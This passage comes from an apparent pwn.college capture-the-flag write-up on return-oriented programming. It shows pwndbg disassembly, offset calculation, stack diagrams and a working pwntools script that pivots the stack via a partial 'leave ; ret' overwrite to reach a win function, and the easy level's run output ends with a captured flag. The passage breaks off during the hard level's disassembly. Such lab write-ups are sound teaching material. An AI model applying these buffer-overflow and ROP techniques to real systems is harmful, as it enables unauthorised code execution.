   0x0000000000001d66 <+36>:    call   0x1160 <puts@plt>
   0x0000000000001d6b <+41>:    lea    rdi,[rip+0x149e]        # 0x3210
   0x0000000000001d72 <+48>:    call   0x1160 <puts@plt>
   0x0000000000001d77 <+53>:    lea    rdx,[rbp-0x70]
   0x0000000000001d7b <+57>:    mov    eax,0x0
   0x0000000000001d80 <+62>:    mov    ecx,0xc
   0x0000000000001d85 <+67>:    mov    rdi,rdx
   0x0000000000001d88 <+70>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001d8b <+73>:    mov    rax,rsp
   0x0000000000001d8e <+76>:    mov    QWORD PTR [rip+0x32cb],rax        # 0x5060 <sp_>
   0x0000000000001d95 <+83>:    mov    rax,rbp
   0x0000000000001d98 <+86>:    mov    QWORD PTR [rip+0x32a1],rax        # 0x5040 <bp_>
   0x0000000000001d9f <+93>:    mov    rdx,QWORD PTR [rip+0x329a]        # 0x5040 <bp_>
   0x0000000000001da6 <+100>:   mov    rax,QWORD PTR [rip+0x32b3]        # 0x5060 <sp_>
   0x0000000000001dad <+107>:   sub    rdx,rax
   0x0000000000001db0 <+110>:   mov    rax,rdx
   0x0000000000001db3 <+113>:   shr    rax,0x3
   0x0000000000001db7 <+117>:   add    rax,0x2
   0x0000000000001dbb <+121>:   mov    QWORD PTR [rip+0x328e],rax        # 0x5050 <sz_>
   0x0000000000001dc2 <+128>:   mov    rax,QWORD PTR [rip+0x3277]        # 0x5040 <bp_>
   0x0000000000001dc9 <+135>:   add    rax,0x8
   0x0000000000001dcd <+139>:   mov    QWORD PTR [rip+0x3284],rax        # 0x5058 <rp_>
   0x0000000000001dd4 <+146>:   lea    rdi,[rip+0x149d]        # 0x3278
   0x0000000000001ddb <+153>:   call   0x1160 <puts@plt>
   0x0000000000001de0 <+158>:   lea    rdi,[rip+0x1511]        # 0x32f8
   0x0000000000001de7 <+165>:   call   0x1160 <puts@plt>
   0x0000000000001dec <+170>:   lea    rdi,[rip+0x157d]        # 0x3370
   0x0000000000001df3 <+177>:   call   0x1160 <puts@plt>
   0x0000000000001df8 <+182>:   lea    rdi,[rip+0x15e9]        # 0x33e8
   0x0000000000001dff <+189>:   call   0x1160 <puts@plt>
   0x0000000000001e04 <+194>:   lea    rdi,[rip+0x1655]        # 0x3460
   0x0000000000001e0b <+201>:   call   0x1160 <puts@plt>
   0x0000000000001e10 <+206>:   lea    rdi,[rip+0x1699]        # 0x34b0
   0x0000000000001e17 <+213>:   call   0x1160 <puts@plt>
   0x0000000000001e1c <+218>:   lea    rax,[rbp-0x70]
   0x0000000000001e20 <+222>:   mov    edx,0x8
   0x0000000000001e25 <+227>:   mov    rsi,rax
   0x0000000000001e28 <+230>:   lea    rdi,[rip+0x16d1]        # 0x3500
   0x0000000000001e2f <+237>:   mov    eax,0x0
   0x0000000000001e34 <+242>:   call   0x1190 <printf@plt>
   0x0000000000001e39 <+247>:   lea    rdi,[rip+0x1708]        # 0x3548
   0x0000000000001e40 <+254>:   call   0x1160 <puts@plt>
   0x0000000000001e45 <+259>:   lea    rdi,[rip+0x1764]        # 0x35b0
   0x0000000000001e4c <+266>:   call   0x1160 <puts@plt>
   0x0000000000001e51 <+271>:   lea    rdi,[rip+0x1790]        # 0x35e8
   0x0000000000001e58 <+278>:   call   0x1160 <puts@plt>
   0x0000000000001e5d <+283>:   lea    rdi,[rip+0x17b4]        # 0x3618
   0x0000000000001e64 <+290>:   call   0x1160 <puts@plt>
   0x0000000000001e69 <+295>:   lea    rdi,[rip+0x17e8]        # 0x3658
   0x0000000000001e70 <+302>:   call   0x1160 <puts@plt>
   0x0000000000001e75 <+307>:   lea    rdi,[rip+0x17fc]        # 0x3678
   0x0000000000001e7c <+314>:   call   0x1160 <puts@plt>
   0x0000000000001e81 <+319>:   lea    rdi,[rip+0x1828]        # 0x36b0
   0x0000000000001e88 <+326>:   call   0x1160 <puts@plt>
   0x0000000000001e8d <+331>:   lea    rdi,[rip+0x1854]        # 0x36e8
   0x0000000000001e94 <+338>:   call   0x1160 <puts@plt>
   0x0000000000001e99 <+343>:   lea    rax,[rbp-0x70]
   0x0000000000001e9d <+347>:   add    rax,0x8
   0x0000000000001ea1 <+351>:   mov    rsi,rax
   0x0000000000001ea4 <+354>:   lea    rdi,[rip+0x1885]        # 0x3730
   0x0000000000001eab <+361>:   mov    eax,0x0
   0x0000000000001eb0 <+366>:   call   0x1190 <printf@plt>
   0x0000000000001eb5 <+371>:   mov    r9d,0x0
   0x0000000000001ebb <+377>:   mov    r8d,0x0
   0x0000000000001ec1 <+383>:   mov    ecx,0x22
   0x0000000000001ec6 <+388>:   mov    edx,0x3
   0x0000000000001ecb <+393>:   mov    esi,0x138
   0x0000000000001ed0 <+398>:   mov    edi,0x0
   0x0000000000001ed5 <+403>:   call   0x1180 <mmap@plt>
   0x0000000000001eda <+408>:   mov    QWORD PTR [rbp-0x70],rax
   0x0000000000001ede <+412>:   mov    rax,QWORD PTR [rbp-0x70]
   0x0000000000001ee2 <+416>:   mov    edx,0x138
   0x0000000000001ee7 <+421>:   lea    rsi,[rip+0x1872]        # 0x3760
   0x0000000000001eee <+428>:   mov    rdi,rax
   0x0000000000001ef1 <+431>:   call   0x11d0 <memcpy@plt>
   0x0000000000001ef6 <+436>:   mov    rax,QWORD PTR [rbp-0x70]
   0x0000000000001efa <+440>:   mov    edx,0x5
   0x0000000000001eff <+445>:   mov    esi,0x138
   0x0000000000001f04 <+450>:   mov    rdi,rax
   0x0000000000001f07 <+453>:   call   0x1220 <mprotect@plt>
   0x0000000000001f0c <+458>:   test   eax,eax
   0x0000000000001f0e <+460>:   je     0x1f2f <challenge+493>
   0x0000000000001f10 <+462>:   lea    rcx,[rip+0x1a31]        # 0x3948 <__PRETTY_FUNCTION__.23120>
   0x0000000000001f17 <+469>:   mov    edx,0xa0
   0x0000000000001f1c <+474>:   lea    rsi,[rip+0x188c]        # 0x37af
   0x0000000000001f23 <+481>:   lea    rdi,[rip+0x188e]        # 0x37b8
   0x0000000000001f2a <+488>:   call   0x11a0 <__assert_fail@plt>
   0x0000000000001f2f <+493>:   mov    rax,QWORD PTR [rbp-0x70]
   0x0000000000001f33 <+497>:   mov    rsi,rax
   0x0000000000001f36 <+500>:   lea    rdi,[rip+0x18bb]        # 0x37f8
   0x0000000000001f3d <+507>:   mov    eax,0x0
   0x0000000000001f42 <+512>:   call   0x1190 <printf@plt>
   0x0000000000001f47 <+517>:   lea    rax,[rbp-0x70]
   0x0000000000001f4b <+521>:   add    rax,0x8
   0x0000000000001f4f <+525>:   mov    edx,0x1000
   0x0000000000001f54 <+530>:   mov    rsi,rax
   0x0000000000001f57 <+533>:   mov    edi,0x0
   0x0000000000001f5c <+538>:   call   0x11b0 <read@plt>
   0x0000000000001f61 <+543>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001f64 <+546>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001f67 <+549>:   cdqe
   0x0000000000001f69 <+551>:   lea    rdx,[rbp-0x70]
   0x0000000000001f6d <+555>:   lea    rcx,[rdx+0x8]
   0x0000000000001f71 <+559>:   mov    rdx,QWORD PTR [rip+0x30e0]        # 0x5058 <rp_>
   0x0000000000001f78 <+566>:   sub    rcx,rdx
   0x0000000000001f7b <+569>:   mov    rdx,rcx
   0x0000000000001f7e <+572>:   add    rax,rdx
   0x0000000000001f81 <+575>:   shr    rax,0x3
   0x0000000000001f85 <+579>:   mov    rdx,rax
   0x0000000000001f88 <+582>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001f8b <+585>:   mov    esi,eax
   0x0000000000001f8d <+587>:   lea    rdi,[rip+0x18a4]        # 0x3838
   0x0000000000001f94 <+594>:   mov    eax,0x0
   0x0000000000001f99 <+599>:   call   0x1190 <printf@plt>
   0x0000000000001f9e <+604>:   lea    rdi,[rip+0x18cb]        # 0x3870
   0x0000000000001fa5 <+611>:   call   0x1160 <puts@plt>
   0x0000000000001faa <+616>:   lea    rdi,[rip+0x1927]        # 0x38d8
   0x0000000000001fb1 <+623>:   call   0x1160 <puts@plt>
   0x0000000000001fb6 <+628>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001fb9 <+631>:   cdqe
   0x0000000000001fbb <+633>:   lea    rdx,[rbp-0x70]
   0x0000000000001fbf <+637>:   lea    rcx,[rdx+0x8]
   0x0000000000001fc3 <+641>:   mov    rdx,QWORD PTR [rip+0x308e]        # 0x5058 <rp_>
   0x0000000000001fca <+648>:   sub    rcx,rdx
   0x0000000000001fcd <+651>:   mov    rdx,rcx
   0x0000000000001fd0 <+654>:   add    rax,rdx
   0x0000000000001fd3 <+657>:   shr    rax,0x3
   0x0000000000001fd7 <+661>:   add    eax,0x1
   0x0000000000001fda <+664>:   mov    edx,eax
   0x0000000000001fdc <+666>:   mov    rax,QWORD PTR [rip+0x3075]        # 0x5058 <rp_>
   0x0000000000001fe3 <+673>:   mov    esi,edx
   0x0000000000001fe5 <+675>:   mov    rdi,rax
   0x0000000000001fe8 <+678>:   call   0x1720 <print_chain>
   0x0000000000001fed <+683>:   lea    rdi,[rip+0x1926]        # 0x391a
   0x0000000000001ff4 <+690>:   call   0x1160 <puts@plt>
   0x0000000000001ff9 <+695>:   nop
   0x0000000000001ffa <+696>:   leave
   0x0000000000001ffb <+697>:   ret
End of assembler dump.
```

Let us set a breakpoint at `challenge+538` where the call to `read()` is made.

```
pwndbg> break *(challenge+538)
Breakpoint 1 at 0x1f5c
```

```
pwndbg> run
Starting program: /challenge/pivotal-pointer-easy 
###
### Welcome to /challenge/pivotal-pointer-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
might take anywhere from 0-12 bits of bruteforce depending on the scenario.

In this challenge, a pointer to the win function is stored on the stack.
That pointer is stored at 0x7fff122d4e00, 8 bytes before your input buffer.
If you can pivot the stack to make the next gadget run be that win function, you will get the flag!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7fff122d4e08.

The win function has just been dynamically constructed at 0x7d32b1c75000.

Breakpoint 1, 0x00006343e1bc3f5c in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7fff122d4e08 ◂— 0
 RBX  0x6343e1bc40c0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7fff122d4e08 ◂— 0
 R8   0x4a
 R9   0x4a
 R10  0x6343e1bc5834 ◂— 0x6563655200000a2e /* '.\n' */
 R11  0x246
 R12  0x6343e1bc3240 (_start) ◂— endbr64 
 R13  0x7fff122d4f90 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff122d4e70 —▸ 0x7fff122d4ea0 ◂— 0
 RSP  0x7fff122d4de0 ◂— 0xd68 /* 'h\r' */
 RIP  0x6343e1bc3f5c (challenge+538) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x6343e1bc3f5c <challenge+538>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7fff122d4e08 ◂— 0
        nbytes: 0x1000
 
   0x6343e1bc3f61 <challenge+543>    mov    dword ptr [rbp - 4], eax
   0x6343e1bc3f64 <challenge+546>    mov    eax, dword ptr [rbp - 4]
   0x6343e1bc3f67 <challenge+549>    cdqe   
   0x6343e1bc3f69 <challenge+551>    lea    rdx, [rbp - 0x70]
   0x6343e1bc3f6d <challenge+555>    lea    rcx, [rdx + 8]
   0x6343e1bc3f71 <challenge+559>    mov    rdx, qword ptr [rip + 0x30e0]     RDX, [rp_]
   0x6343e1bc3f78 <challenge+566>    sub    rcx, rdx
   0x6343e1bc3f7b <challenge+569>    mov    rdx, rcx
   0x6343e1bc3f7e <challenge+572>    add    rax, rdx
   0x6343e1bc3f81 <challenge+575>    shr    rax, 3
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff122d4de0 ◂— 0xd68 /* 'h\r' */
01:0008│-088     0x7fff122d4de8 —▸ 0x7fff122d4fa8 —▸ 0x7fff122d6689 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-080     0x7fff122d4df0 —▸ 0x7fff122d4f98 —▸ 0x7fff122d6669 ◂— '/challenge/pivotal-pointer-easy'
03:0018│-078     0x7fff122d4df8 ◂— 0x10000000a /* '\n' */
04:0020│-070     0x7fff122d4e00 —▸ 0x7d32b1c75000 ◂— push rbp
05:0028│ rax rsi 0x7fff122d4e08 ◂— 0
... ↓            2 skipped
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6343e1bc3f5c challenge+538
   1   0x6343e1bc40a1 main+165
   2   0x7d32b0a39083 __libc_start_main+243
   3   0x6343e1bc326e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
   - Location of the buffer: `0x7fff122d4e08`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

Let's get the location of the stored return pointer, and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7fff122d4e80:
 rip = 0x6343e1bc3f5c in challenge; saved rip = 0x6343e1bc40a1
 called by frame at 0x7fff122d4eb0
 Arglist at 0x7fff122d4e70, args: 
 Locals at 0x7fff122d4e70, Previous frame's sp is 0x7fff122d4e80
 Saved registers:
  rbp at 0x7fff122d4e70, rip at 0x7fff122d4e78
```

```
pwndbg> p/d 0x7fff122d4e78 - 0x7fff122d4e08
$1 = 112
```

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
   - Location of the buffer: `0x7fff122d4e08`
   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

#### ROP gadgets

The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.

We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.

We know that the `leave ; ret` instructions are at the epilogue of every function.
We also know where this gadget is in the `challenge()` function:

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x00006343e1bc3ffa <+696>:   leave
   0x00006343e1bc3ffb <+697>:   ret
End of assembler dump.
```

Let's find the address of the same gadget in `main()`.

```
pwndbg> disassemble main
Dump of assembler code for function main:

# ---- snip ----

   0x00006343e1bc40b2 <+182>:   leave
   0x00006343e1bc40b3 <+183>:   ret
End of assembler dump.
```

Finally, since we want to overwrite the stored return pointer, let's check it's value as well.

```
pwndbg> x/gx 0x7fff122d4e78
0x7fff122d4e78: 0x00006343e1bc40a1
```

We can see that the address of the `leave ; ret` gadget in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x40\xb3` vs `\x40\xa1`).
Where the address of the gadget in `challenge()` only differs in the four least significant nibbles as compared to the value of the stored return pointer (`\x3f\xfa` vs `\x40\xa1`).

So, if we use the `leave ; ret` gadget present in `main()` we will only have to overwrite the two least significant nibbles, which we can do deterministically. 

This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
   - Location of the buffer: `0x7fff122d4e08`
   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
- [x] LSB of required ROP gadgets:
   - `leave ; ret`: `\xb2`
- [ ] Offset of the overwritten stored base pointer value from the buffer

Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. This will be clear when looking at the ROP chain.

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
   - Location of the buffer: `0x7fff122d4e08`
   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
- [x] LSB of required ROP gadgets:
   - `leave ; ret`: `\xb2`
- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`

### ROP chain: Stack pivot + ret2win

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7fff122d4e78 │  .. .. .. .. .. .. 40 b2  │ --> ( leave ; ret within main() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e78 │  .. .. .. .. .. .. 40 b2  │ --> ( leave ; ret within main() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7fff122d4e78 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> mov rsp, rbp ; pop rbp ; ret 
      \\ leave is the same as (mov rsp, rbp ; pop rbp)
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff122d4df8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7fff122d4df8

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rbp ; ret 
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff122d4e00 │  00 00 7d 32 b1 c7 50 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7fff122d4df8
rbp: 0x............ (Points to some random address)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret 
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff122d4e08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e68 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7fff122d4df8
rbp: 0x............ (Points to some random address)
rip: 0x7d32b1c75000

═══════════════════════════════════════════════════════════════════════════════════
rip --> win() 
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
leave_lsb = b"\xb2"
# Memory addresses and offsets
rip_offset = 112
rbp_offset = rip_offset - 8

p = process('/challenge/pivotal-pointer-easy')

# Parse leaks
p.recvuntil(b"buffer is located at: ")
buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)

# Pivot logic
# win_ptr is at leak-8. 
# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
target_rbp = buffer_addr - 16

# Stable 1-byte pivot payload
payload = flat(
    b"A" * rbp_offset,
    target_rbp,
    leave_lsb
)

p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~pivotal-pointer-easy:/$ python ~/script.py
[+] Starting local process '/challenge/pivotal-pointer-easy': pid 29641
[*] Switching to interactive mode

The win function has just been dynamically constructed at 0x737864a89000.
[*] Process '/challenge/pivotal-pointer-easy' stopped with exit code -11 (SIGSEGV) (pid 29641)
Received 113 bytes! This is potentially 0 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 1 gadgets of ROP chain at 0x7fff4ba5a518.
| 0x000062089e1370b2: leave  ; ret  ; 

Leaving!
pwn.college{oEI77xky8mDiFExvX_2R4c7FTiN.0VO1MDL4ITM0EzW}
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Pivotal Pointer (Hard)

```
hacker@return-oriented-programming~pivotal-pointer-hard:/$ /challenge/pivotal-pointer-hard 
###
### Welcome to /challenge/pivotal-pointer-hard!
###

[LEAK] Your input buffer is located at: 0x7ffcec90ff48.

```

Requirements for crafting a successful exploit:

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

### Binary Analysis

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001da4 <+0>:     endbr64
   0x0000000000001da8 <+4>:     push   rbp
   0x0000000000001da9 <+5>:     mov    rbp,rsp
   0x0000000000001dac <+8>:     add    rsp,0xffffffffffffff80
   0x0000000000001db0 <+12>:    mov    DWORD PTR [rbp-0x64],edi
   0x0000000000001db3 <+15>:    mov    QWORD PTR [rbp-0x70],rsi
   0x0000000000001db7 <+19>:    mov    QWORD PTR [rbp-0x78],rdx
   0x0000000000001dbb <+23>:    lea    rdx,[rbp-0x60]
   0x0000000000001dbf <+27>:    mov    eax,0x0
   0x0000000000001dc4 <+32>:    mov    ecx,0xb
   0x0000000000001dc9 <+37>:    mov    rdi,rdx
   0x0000000000001dcc <+40>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001dcf <+43>:    lea    rax,[rbp-0x60]
   0x0000000000001dd3 <+47>:    add    rax,0x8
   0x0000000000001dd7 <+51>:    mov    rsi,rax
   0x0000000000001dda <+54>:    lea    rdi,[rip+0x227]        # 0x2008
   0x0000000000001de1 <+61>:    mov    eax,0x0
   0x0000000000001de6 <+66>:    call   0x1100 <printf@plt>
   0x0000000000001deb <+71>:    mov    r9d,0x0
   0x0000000000001df1 <+77>:    mov    r8d,0x0
   0x0000000000001df7 <+83>:    mov    ecx,0x22
   0x0000000000001dfc <+88>:    mov    edx,0x3
   0x0000000000001e01 <+93>:    mov    esi,0x138
   0x0000000000001e06 <+98>:    mov    edi,0x0
   0x0000000000001e0b <+103>:   call   0x10f0 <mmap@plt>
   0x0000000000001e10 <+108>:   mov    QWORD PTR [rbp-0x60],rax
   0x0000000000001e14 <+112>:   mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000001e18 <+116>:   mov    edx,0x138
   0x0000000000001e1d <+121>:   lea    rsi,[rip+0x214]        # 0x2038
   0x0000000000001e24 <+128>:   mov    rdi,rax
   0x0000000000001e27 <+131>:   call   0x1130 <memcpy@plt>
   0x0000000000001e2c <+136>:   mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000001e30 <+140>:   mov    edx,0x5
   0x0000000000001e35 <+145>:   mov    esi,0x138
   0x0000000000001e3a <+150>:   mov    rdi,rax
   0x0000000000001e3d <+153>:   call   0x1150 <mprotect@plt>
   0x0000000000001e42 <+158>:   test   eax,eax
   0x0000000000001e44 <+160>:   je     0x1e65 <challenge+193>
   0x0000000000001e46 <+162>:   lea    rcx,[rip+0x2ab]        # 0x20f8 <__PRETTY_FUNCTION__.5687>
   0x0000000000001e4d <+169>:   mov    edx,0x2a
   0x0000000000001e52 <+174>:   lea    rsi,[rip+0x22e]        # 0x2087
   0x0000000000001e59 <+181>:   lea    rdi,[rip+0x230]        # 0x2090
   0x0000000000001e60 <+188>:   call   0x1110 <__assert_fail@plt>
   0x0000000000001e65 <+193>:   lea    rax,[rbp-0x60]
   0x0000000000001e69 <+197>:   add    rax,0x8
   0x0000000000001e6d <+201>:   mov    edx,0x1000
   0x0000000000001e72 <+206>:   mov    rsi,rax
   0x0000000000001e75 <+209>:   mov    edi,0x0
   0x0000000000001e7a <+214>:   call   0x1120 <read@plt>
   0x0000000000001e7f <+219>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001e82 <+222>:   lea    rdi,[rip+0x240]        # 0x20c9
   0x0000000000001e89 <+229>:   call   0x10e0 <puts@plt>
